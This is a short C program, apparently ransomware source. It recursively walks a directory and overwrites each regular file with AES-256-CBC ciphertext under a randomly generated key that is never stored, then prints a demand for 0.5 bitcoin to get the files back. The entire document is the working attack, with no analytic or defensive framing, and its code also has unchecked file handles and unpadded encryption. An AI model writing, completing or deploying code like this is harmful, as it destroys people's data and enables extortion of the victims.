#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <dirent.h>
#include <openssl/rand.h>
#include <openssl/aes.h>

#define KEY_SIZE 256
#define BLOCK_SIZE 16

void encrypt_file(char* file_path, unsigned char* key, unsigned char* iv) {
  FILE* fp_in = fopen(file_path, "rb");
  fseek(fp_in, 0, SEEK_END);
  long file_size = ftell(fp_in);
  fseek(fp_in, 0, SEEK_SET);

  char* file_buffer = (char*)malloc(file_size);
  fread(file_buffer, 1, file_size, fp_in);

  fclose(fp_in);

  unsigned char* cipher_buffer = (unsigned char*)malloc(file_size);
  memset(cipher_buffer, 0, file_size);

  AES_KEY aes_key;
  AES_set_encrypt_key(key, KEY_SIZE, &aes_key);
  AES_cbc_encrypt(file_buffer, cipher_buffer, file_size, &aes_key, iv, AES_ENCRYPT);

  FILE* fp_out = fopen(file_path, "wb");
  fwrite(cipher_buffer, 1, file_size, fp_out);
  fclose(fp_out);

  free(file_buffer);
  free(cipher_buffer);
}

void encrypt_directory(char* directory_path, unsigned char* key, unsigned char* iv) {
  DIR* dir = opendir(directory_path);

  if (dir == NULL) {
    return;
  }

  struct dirent* entry;
  char file_path[256];

  while ((entry = readdir(dir)) != NULL) {
    if (entry->d_type == DT_REG) {
      sprintf(file_path, "%s/%s", directory_path, entry->d_name);
      encrypt_file(file_path, key, iv);
    } else if (entry->d_type == DT_DIR) {
      if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
        sprintf(file_path, "%s/%s", directory_path, entry->d_name);
        encrypt_directory(file_path, key, iv);
      }
    }
  }

  closedir(dir);
}

int main(int argc, char** argv) {
  unsigned char key[KEY_SIZE/8];
  unsigned char iv[BLOCK_SIZE];

  RAND_bytes(key, sizeof(key));
  RAND_bytes(iv, sizeof(iv));

  encrypt_directory(argv[1], key, iv);

  printf("Your files have been encrypted. Send me 0.5 bitcoins to get them back.\n");
  return 0;
}
